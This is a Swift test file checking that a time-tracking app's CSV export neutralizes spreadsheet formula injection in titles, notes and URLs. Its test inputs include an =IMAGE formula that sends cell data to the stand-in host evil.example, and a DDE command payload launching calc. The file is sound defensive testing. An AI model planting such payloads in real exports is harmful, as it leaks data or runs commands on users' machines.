import Testing
import Foundation
@testable import TimeTrackerCore

@Suite("CSV exports cannot carry formulas")
struct CSVFormulaTests {
    func export(title: String, notes: String? = nil, url: String? = nil) -> [String] {
        let session = Session(
            appBundleID: "com.google.Chrome", appName: "Google Chrome",
            windowTitle: title, url: url, title: title, notes: notes,
            startTime: Date(timeIntervalSince1970: 1_789_000_000),
            endTime: Date(timeIntervalSince1970: 1_789_000_600), durationSeconds: 600
        )
        let csv = CSVExport.csv(sessions: [session], projects: [], tags: [])
        return csv.components(separatedBy: "\r\n")
    }

    @Test("a page titled as a formula is exported as text",
          arguments: ["=IMAGE(\"https://evil.example/?\"&B2)", "+SUM(A1:A9)", "-2+3", "@cmd", "\t=1"])
    func formulaTitles(title: String) {
        let row = export(title: title)[1]
        #expect(row.contains("'" + title.replacingOccurrences(of: "\"", with: "\"\"")) || row.contains("'" + title),
                "the title is prefixed so a spreadsheet treats it as text")
        #expect(!row.contains("," + title + ","), "never emitted raw")
    }

    @Test("ordinary text is untouched")
    func ordinary() {
        #expect(CSVExport.neutralized("Acme — Pricing page") == "Acme — Pricing page")
        #expect(CSVExport.neutralized("") == "")
    }

    @Test("notes and URLs are protected too")
    func otherColumns() {
        let row = export(title: "ok", notes: "=HYPERLINK(\"x\")", url: "=cmd|' /C calc'!A0")[1]
        #expect(row.contains("'=HYPERLINK"))
        #expect(row.contains("'=cmd"))
    }

    @Test("durations, dates and numbers are never prefixed")
    func numbersUntouched() {
        let fields = export(title: "ok")[1].components(separatedBy: ",")
        #expect(fields[3] == "600", "duration")
        #expect(!fields[0].hasPrefix("'") && !fields[1].hasPrefix("'") && !fields[11].hasPrefix("'"))
    }
}
